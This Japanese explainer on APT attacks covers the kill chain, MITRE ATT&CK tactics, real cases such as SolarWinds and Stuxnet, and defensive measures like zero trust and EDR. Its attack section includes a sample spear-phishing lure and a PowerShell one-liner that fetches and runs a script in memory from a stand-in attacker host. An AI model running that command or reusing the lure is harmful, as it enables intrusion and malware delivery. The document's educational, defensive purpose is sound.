## APT攻撃解説

APT攻撃（Advanced Persistent Threat）は、日本語で「高度で持続的な脅威」と訳され、特定の組織や個人を標的として、長期間にわたり潜伏・活動する、極めて巧妙かつ悪質なサイバー攻撃です。 その目的は、金銭的な利益を狙う一般的なサイバー攻撃とは一線を画し、機密情報の窃取や社会インフラの破壊など、国家的な背景を持つスパイ活動や妨害工作であることが少なくありません。

本稿では、APT攻撃の定義や特徴といった基本的な知識から、攻撃者が用いる具体的な手法、近年の傾向、そして組織が取るべき実践的な対策まで、網羅的に解説します。

### 第1章: APT攻撃とは何か

#### 1-1. APTの定義
APTは、以下の3つの要素を組み合わせた言葉です。

*   **Advanced（高度な）**: 攻撃者は、ゼロデイ脆弱性（未公開の脆弱性）を悪用するマルウェアや、侵入検知システムを回避する高度な技術を駆使します。また、標的組織の業務内容や人間関係を徹底的に調査し、ソーシャルエンジニアリングを巧妙に利用します。
*   **Persistent（執拗な・持続的な）**: 一度ネットワーク内に侵入すると、発覚しないように数ヶ月から数年という長期間にわたって潜伏し続けます。目的を達成するまで、あるいは目的達成後も、持続的に活動するのが特徴です。
*   **Threat（脅威）**: 攻撃者は明確な目的を持った組織的なグループ（攻撃者集団）であり、十分な資金力と技術力を背景に、標的に対して深刻な脅威をもたらします。

#### 1-2. 一般的なサイバー攻撃との違い

| 特徴 | APT攻撃 | 一般的なサイバー攻撃（ばらまき型など） |
| :--- | :--- | :--- |
| **標的** | 特定の組織・個人（政府機関、重要インフラ、大手企業など） | 不特定多数 |
| **目的** | 機密情報・知的財産の窃取、インフラ破壊、スパイ活動、妨害工作 | 金銭（身代金、不正送金）、個人情報の売買、愉快犯 |
| **期間** | 長期間（数ヶ月〜数年） | 短期間 |
| **手法** | 高度で多様な手法を組み合わせ、発覚を徹底的に回避 | 比較的単純な手法、感染を広げることを重視 |
| **攻撃者** | 国家が支援するグループや高度なスキルを持つ犯罪組織 | 個人または比較的緩やかな繋がりのグループ |

ランサムウェア攻撃も金銭目的という点では一般的な攻撃に分類されますが、近年ではAPT攻撃の手法を取り入れ、特定の企業を狙い撃ちにし、データを暗号化するだけでなく窃取も行い「二重恐喝」を行うケースが増えています。

### 第2章: APT攻撃の解剖学 - 攻撃キャンペーンの段階

APT攻撃は、場当たり的に行われるものではなく、周到な計画に基づき、複数の段階を経て実行されます。ここでは、攻撃者の行動をモデル化した2つの代表的なフレームワーク、「サイバー・キルチェーン」と「MITRE ATT&CK」に沿って、その手口を解説します。

#### 2-1. サイバー・キルチェーン・モデル

軍事用語の「キルチェーン」をサイバー攻撃に適用したモデルで、攻撃プロセスを7つの段階に分類します。 防御側は、このチェーンのいずれかの段階を断ち切ることで、攻撃の最終目的の達成を阻止できると考えます。

1.  **偵察 (Reconnaissance)**: 攻撃の準備段階。標的組織の公式サイト、SNS、報道、技術ブログなどから、従業員の氏名・役職・メールアドレス、使用しているシステムやネットワーク構成といった情報を収集します。
2.  **武器化 (Weaponization)**: 偵察で得た情報を基に、攻撃用のマルウェア（RAT: Remote Access Toolなど）や、それを埋め込んだファイル（Word, PDFなど）を作成します。
3.  **配送 (Delivery)**: 作成した「武器」を標的に送り届けます。最も一般的な手法は、業務連絡や求人応募などを装った「標的型攻撃メール」です。
4.  **攻撃 (Exploitation)**: 標的がメールの添付ファイルを開いたり、本文中のURLをクリックしたりすることで、OSやアプリケーションの脆弱性を突いてマルウェアを実行させます。
5.  **インストール (Installation)**: マルウェアが標的の端末にインストールされ、PC起動時に自動実行されるよう設定するなど、永続的な活動の足掛かりを築きます。
6.  **遠隔操作 (Command & Control / C2)**: マルウェアは、外部に設置されたC2サーバーと通信を確立します。攻撃者はこのC2サーバーを経由して、侵入した端末を遠隔操作します。
7.  **目的の達成 (Actions on Objectives)**: 攻撃者が最終目的を遂行する段階。ネットワーク内部をさらに偵察し、より高い権限を持つアカウントを奪取（権限昇格）、他の端末へ侵入を拡大（横展開）しながら、目的のデータを探し出し、外部へ送信（窃取）します。

#### 2-2. MITRE ATT&CK® フレームワーク

サイバー・キルチェーンが攻撃の流れを大まかに捉えるのに対し、MITRE ATT&CK（Adversarial Tactics, Techniques, and Common Knowledge）は、攻撃者の「戦術（Tactics）」と、その戦術を実現するための具体的な「技術（Techniques）」を体系化したナレッジベースです。

ATT&CKは、実際の攻撃で観測された膨大なデータに基づいており、各技術には具体的な攻撃グループやマルウェアの事例、そしてそれらへの「緩和策（Mitigation）」や「検知方法（Detection）」が紐づけられています。 これにより、組織は自社のセキュリティ対策が、どの戦術・技術に対応できているかを客観的に評価し、強化すべき点を特定できます。

**Enterprise ATT&CK Matrix の戦術（一部抜粋）**

| 戦術 (Tactics) | 説明 |
| :--- | :--- |
| **Initial Access (初期侵入)** | 組織のネットワークへの最初の足がかりを築く。 |
| **Execution (実行)** | 攻撃者のコードを実行させる。 |
| **Persistence (永続化)** | 侵入した環境へのアクセスを維持する。 |
| **Privilege Escalation (権限昇格)** | より高いレベルの権限（管理者権限など）を得る。 |
| **Defense Evasion (防御回避)** | セキュリティ対策による検知を回避する。 |
| **Credential Access (認証情報アクセス)** | システムやアカウントの認証情報を窃取する。 |
| **Discovery (発見)** | ネットワーク内部の環境を調査する。 |
| **Lateral Movement (横展開)** | ネットワーク内の他のシステムへ侵入を拡大する。 |
| **Collection (収集)** | 攻撃目標に関連するデータを集める。 |
| **Command and Control (コマンド＆コントロール)** | 侵害したシステムと通信し、遠隔操作する。 |
| **Exfiltration (情報送出)** | ネットワークからデータを盗み出す。 |
| **Impact (影響)** | システムやデータを破壊、改ざん、妨害する。 |

#### 2-3. 各段階の具体的な手法とコード例

**【初期侵入 (Initial Access)】**

最も多用されるのが、巧妙な**標的型攻撃メール**です。

***
**実践的な例：標的型メールの文面**

> **件名:** 【株式会社〇〇】取材協力のお願い
>
> **本文:**
> 株式会社△△ 編集部の佐藤と申します。
>
> 突然のご連絡失礼いたします。
> 弊誌で「業界のDX推進」に関する特集を企画しており、貴社の先進的な取り組みについて、ぜひ〇〇様にお話を伺いたくご連絡いたしました。
>
> つきましては、添付の企画概要書をご確認の上、ご検討いただけますと幸いです。
>
> 何卒よろしくお願い申し上げます。
>
> ---
> 株式会社△△ 編集部
> 佐藤 太郎
> TEL: xx-xxxx-xxxx
> ---

***

この例では、受信者の実名や会社名を記載し、業務に関連性の高い内容でファイル開封を促します。添付ファイルには、脆弱性を悪用するマクロやスクリプトが埋め込まれています。

**【実行 (Execution) と永続化 (Persistence)】**

ファイルが開かれると、PowerShellなどの正規のツールが悪用され、攻撃コードが実行されます。これは「**Living off the Land (LotL)**」と呼ばれ、OSに標準搭載された機能を使うため、セキュリティ製品による検知が難しいのが特徴です。

***
**具体的なコード例：PowerShellによるファイルレス攻撃**

```powershell
# 悪意のあるスクリプトをWebからダウンロードし、メモリ上で直接実行するコマンドの例
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker-c2-server.com/payload.ps1')"
```

このコマンドは、ウィンドウを非表示にし（`-w hidden`）、C2サーバーから`payload.ps1`というスクリプトをダウンロードして、ディスクに保存することなく直接実行（`IEX`）します。 これにより、ファイルベースのスキャンを回避します。

**【権限昇格 (Privilege Escalation) と横展開 (Lateral Movement)】**

侵入した端末で一般ユーザーの権限しか得られなかった場合、攻撃者は管理者権限の奪取を試みます。その後、ネットワーク内の他の端末へと侵入を広げていきます。代表的な手法に「**Pass-the-Hash (PtH)**」があります。

Windows環境では、ユーザーがログオンするとパスワードそのものではなく、パスワードをハッシュ化した値（ハッシュ値）がメモリ上に保存されます。 PtH攻撃は、このメモリ上にあるハッシュ値を窃取し、それを他の端末への認証に再利用する手法です。 パスワード自体を解読する必要がないため、効率的に横展開を進めることが可能です。

***
**攻撃の流れ（Pass-the-Hash）**

1.  攻撃者は、何らかの方法で最初の端末に侵入し、`mimikatz`のようなツールを使ってメモリから管理者アカウントのパスワードハッシュを窃取します。
2.  窃取したハッシュ値を使い、`PsExec`などの正規のリモート管理ツールを悪用して、ネットワーク内のファイルサーバーやドメインコントローラーに管理者としてログオンします。
3.  目的のサーバーに侵入成功後、さらに内部を探索し、機密データを探します。

**【目的の達成 (Actions on Objectives)】**

最終段階では、収集した機密データを圧縮・暗号化して一つのファイルにまとめ、C2サーバーへ送信します。この際、通常のWebトラフィック（HTTP/HTTPS）に偽装するなどして、データが外部へ送信されていることを悟られないようにします。

### 第3章: 現実世界のAPT攻撃 - 注目すべき事例

*   **日本年金機構 情報流出事件 (2015年)**: 職員が標的型攻撃メールの添付ファイルを開封したことがきっかけでマルウェアに感染。約125万件の個人情報が流出したとされています。APT攻撃の脅威が国内で広く認知される契機となりました。
*   **SolarWinds社サプライチェーン攻撃 (2020年)**: 攻撃者（APT29など）は、ネットワーク管理ソフトウェア「Orion」を開発するSolarWinds社の開発環境に侵入。Orionのアップデートプログラムにバックドアを仕込み、そのアップデートを適用した世界中の約18,000の組織（政府機関や大企業を含む）にマルウェアを拡散させました。自社のセキュリティが強固でも、取引先や利用するソフトウェアが攻撃される「サプライチェーン攻撃」の典型例です。
*   **Stuxnet (2010年頃)**: イランの核施設を標的としたAPT攻撃。遠心分離機を制御する特定の産業用制御システム（ICS）のみを狙い、物理的に破壊することを目的としていました。サイバー攻撃が物理的なインフラに直接的な損害を与えた画期的な事例とされています。

### 第4章: 近年のAPT攻撃のトレンドと進化

*   **サプライチェーン攻撃の常態化**: SolarWinds社の事例のように、セキュリティレベルが比較的低い取引先やソフトウェア開発会社を足がかりに、本来の標的である大企業や政府機関へ侵入するサプライチェーン攻撃が主流になっています。
*   **クラウド環境へのシフト**: 企業のクラウド利用拡大に伴い、攻撃者の標的もクラウド環境へと移行しています。設定ミスのあるクラウドストレージからの情報窃取や、クラウドサービスの認証情報を狙った攻撃が増加しています。
*   **Living off the Land (LotL) の巧妙化**: PowerShellだけでなく、WMI (Windows Management Instrumentation) やcertutilなど、悪用可能な正規ツールは多岐にわたります。 これらのツールはシステム管理に不可欠なため、単純に機能を無効化することが難しく、異常な振る舞いを検知する高度な監視が求められます。
*   **地政学的リスクとの連動**: 国家間の対立や紛争が激化すると、それに連動して相手国の重要インフラや企業を狙ったAPT攻撃が増加する傾向にあります。中国を拠点とするとされる「Volt Typhoon」のような攻撃グループが、米国の重要インフラに長期間潜伏していた事例も報告されています。

### 第5章: APT攻撃への実践的対処法

APT攻撃は極めて巧妙であり、単一のセキュリティ製品で完全に防ぐことは不可能です。「侵入されること」を前提とした、多層的かつ継続的な対策が不可欠です。ここでは、現代のセキュリティの基本理念である「ゼロトラスト」の考え方を軸に、具体的な対策を解説します。

#### 5-1. 基本方針：ゼロトラスト・セキュリティ

従来の「境界型防御」は、社内ネットワーク（内側）は安全、インターネット（外側）は危険とみなし、その境界をファイアウォールなどで守る考え方でした。 しかし、クラウド利用やテレワークの普及により、この境界は曖昧になっています。

「ゼロトラスト」は、「**何も信頼せず、すべてを検証する (Never Trust, Always Verify)**」というアプローチです。 社内ネットワークであろうと、一度認証されたユーザーであろうと、リソースにアクセスするたびに、その正当性を都度検証します。

#### 5-2. 【フェーズ別】具体的な対策手順

APT攻撃のキルチェーンを念頭に、「予防」「検知」「対応」の3つのフェーズで対策を講じることが重要です。

---

#### **【1】 予防 (Prevention) - 侵入と被害拡大を防ぐ**

*   **従業員教育と標的型攻撃メール訓練**:
    *   全従業員を対象に、不審なメールの見分け方（送信元アドレス、不自然な日本語、緊急性を煽る内容など）に関するセキュリティ教育を定期的に実施します。
    *   実際に標的型メールを模した訓練メールを送信し、開封率やURLクリック率を測定。結果をフィードバックして意識向上を図ります。

*   **脆弱性管理とパッチ適用**:
    *   OSやソフトウェアのセキュリティパッチを迅速に適用し、既知の脆弱性を解消します。 これは攻撃の入口を塞ぐ最も基本的な対策です。
    *   脆弱性管理ツールを導入し、組織内のIT資産の脆弱性を網羅的に把握・管理する体制を構築します。

*   **アクセス制御の強化（ゼロトラストの中核）**:
    *   **多要素認証 (MFA)**: IDとパスワードだけでなく、スマートフォンアプリや生体認証などを組み合わせることで、認証情報の窃取による不正アクセスを防ぎます。
    *   **最小権限の原則**: ユーザーには業務上必要最小限の権限のみを付与します。これにより、万が一アカウントが乗っ取られても、被害を限定的にできます。
    *   **ネットワークのセグメンテーション**: ネットワークを部署やシステムの重要度に応じて小さなセグメントに分割します。これにより、横展開（ラテラルムーブメント）を困難にします。

---

#### **【2】 検知 (Detection) - 潜伏する脅威を見つけ出す**

侵入を100%防ぐことは不可能なため、侵入した脅威をいかに早く見つけ出すかが重要です。

*   **EDR (Endpoint Detection and Response) / XDR (Extended Detection and Response)**:
    *   **EDR**: PCやサーバーなどのエンドポイントの操作ログ（プロセスの起動、ファイルアクセス、通信など）を詳細に監視・記録し、不審な振る舞いを検知・対応するソリューションです。 「PowerShellが不審な通信を開始した」といったLotL攻撃の兆候を捉えるのに有効です。
    *   **XDR**: EDRの概念を拡張し、エンドポイントだけでなく、ネットワーク、クラウド、メールなど複数のセキュリティ製品から情報を集約・相関分析することで、より広範囲で高度な脅威検知を実現します。

*   **SIEM (Security Information and Event Management)**:
    *   ファイアウォール、サーバー、EDRなど、様々な機器やシステムからログを収集し、一元的に管理・分析する仕組みです。異なる機器のログを組み合わせることで、単体では見過ごしてしまうような攻撃の兆候を発見できます。

*   **NDR (Network Detection and Response)**:
    *   ネットワークトラフィック全体を監視し、機械学習などを用いて平時とは異なる「異常な通信」を検知します。 C2サーバーとの通信や、内部での横展開の試みなどを捉えるのに役立ちます。

---

#### **【3】 対応 (Response) - 被害を最小化し、復旧する**

万が一インシデント（セキュリティ事故）が発生した場合に、迅速かつ的確に対応するための準備が不可欠です。

*   **インシデントレスポンス計画の策定**:
    *   「誰が、何を、いつ、どのように行うか」を定めた行動計画を事前に策定しておきます。 これには、報告体制、関係者への連絡手順、トリアージ（優先順位付け）、法的要件などが含まれます。

*   **CSIRT (Computer Security Incident Response Team) / SOC (Security Operation Center) の構築**:
    *   **CSIRT**: インシデント発生時に指揮を執り、原因調査や復旧作業などを実行する専門チームです。
    *   **SOC**: EDRやSIEMなどのセキュリティツールを24時間365日体制で監視し、インシデントの兆候をいち早く検知・分析する専門組織です。

*   **インシデント発生時の対応フロー（NISTのフレームワークを参考）**:
    1.  **準備 (Preparation)**: 上記の計画策定や体制構築フェーズ。
    2.  **特定 (Identification)**: SOCからのアラートや利用者からの報告を基に、インシデントの内容と影響範囲を特定します。
    3.  **封じ込め (Containment)**: 感染した端末をネットワークから隔離するなど、被害拡大を防止するための応急処置を講じます。
    4.  **根絶 (Eradication)**: マルウェアの駆除、不正に作成されたアカウントの削除など、攻撃の根本原因をシステムから完全に除去します。
    5.  **復旧 (Recovery)**: システムを正常な状態に復旧させ、安全性を確認した上でサービスを再開します。
    6.  **教訓 (Lessons Learned)**: インシデント対応のプロセス全体をレビューし、報告書を作成。再発防止策を策定し、セキュリティ対策の改善に繋げます。

